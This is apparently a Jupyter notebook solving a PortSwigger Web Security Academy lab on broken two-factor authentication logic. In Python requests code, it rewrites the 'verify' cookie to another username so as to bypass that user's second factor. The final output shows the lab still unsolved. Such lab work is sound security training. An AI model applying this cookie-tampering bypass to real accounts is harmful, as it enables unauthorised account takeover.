{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ad013a31",
   "metadata": {},
   "source": [
    "# 2FA Broken Logic\n",
    "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "517ac8b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "bc773fe1",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://ac3f1fa01e9c6ad8c0d41c1d00da00d4.web-security-academy.net/\"\n",
    "\n",
    "my_credentials = {\"username\" : \"wiener\", \"password\" : \"peter\"}\n",
    "\n",
    "#Post to the initial login screen (triggering the MFA token to be emailed to us)\n",
    "s = requests.session()\n",
    "r = s.post(URL + \"login\", data=my_credentials)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "75b04e3b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'session': 'QEhip3tOi2AgCnMKRjbIHK56xRqqQ7Dt', 'verify': 'wiener'}"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s.cookies.get_dict()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c3af9000",
   "metadata": {},
   "source": [
    "Great so this has prompted an email to be sent with a code. We can manually get the code and paste it into the code below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "29eca965",
   "metadata": {},
   "outputs": [],
   "source": [
    "mfa_code = {\"mfa-code\" : \"0477\"} #Our MFA Code\n",
    "\n",
    "#Specify target:\n",
    "target = \"carlos\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "794897cf",
   "metadata": {},
   "source": [
    "So the 'verify' cookie is our username, but we can change this to the target useername (`carlos`) to see if we can get in."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "6be489f9",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Get and modify cookies\n",
    "cookies = s.cookies.get_dict()\n",
    "cookies['verify'] = target\n",
    "\n",
    "r = requests.post(URL + \"login2\", data = mfa_code, cookies = requests.cookies.cookiejar_from_dict(cookies))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "6062b761",
   "metadata": {},
   "outputs": [],
   "source": [
    "r = requests.get(URL + \"my-account\", cookies = requests.cookies.cookiejar_from_dict(cookies))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "a44c9ef8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html>\\n<html>\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n        <title>2FA broken logic</title>\\n    </head>\\n    <body>\\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\\n        \\n        <div id=\"academyLabHeader\">\\n            <section class=\"academyLabBanner\">\\n                <div class=\"container\">\\n                    <div class=\"logo\"></div>\\n                        <div class=\"title-container\">\\n                            <h2>2FA broken logic</h2>\\n                            <a id=\\'lab-link\\' class=\\'button\\' href=\\'/\\'>Back to lab home</a>\\n                            <a id=\\'exploit-link\\' class=\\'button\\' target=\\'_blank\\' href=\\'https://exploit-ac7b1fd01ecc6aa4c0011c4b011200df.web-security-academy.net/email\\'>Email client</a>\\n                            <a class=\"link-back\" href=\"https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic\">\\n                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;\\n                                <svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" viewBox=\"0 0 28 30\" enable-background=\"new 0 0 28 30\" xml:space=\"preserve\" title=\"back-arrow\">\\n                                    <g>\\n                                        <polygon points=\"1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\"></polygon>\\n                                        <polygon points=\"14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\"></polygon>\\n                                    </g>\\n                                </svg>\\n                            </a>\\n                        </div>\\n                        <div class=\"widgetcontainer-lab-status is-notsolved\">\\n                            <span>LAB</span>\\n                            <p>Not solved</p>\\n                            <span class=\"lab-status-icon\"></span>\\n                        </div>\\n                    </div>\\n                </div>\\n            </section>\\n        </div>\\n\\n        <div theme=\"\">\\n            <section class=\"maincontainer\">\\n                <div class=\"container is-page\">\\n                    <header class=\"navigation-header\">\\n                        <section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>\\n                    </header>\\n                    <header class=\"notification-header\">\\n                    </header>\\n                    <h1>Login</h1>\\n                    <section>\\n                        <form class=login-form method=POST action=/login>\\n                            <label>Username</label>\\n                            <input required type=username name=\"username\">\\n                            <label>Password</label>\\n                            <input required type=password name=\"password\">\\n                            <button class=button type=submit> Log in </button>\\n                        </form>\\n                    </section>\\n                </div>\\n            </section>\\n        </div>\\n    </body>\\n</html>\\n'"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ed808d5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
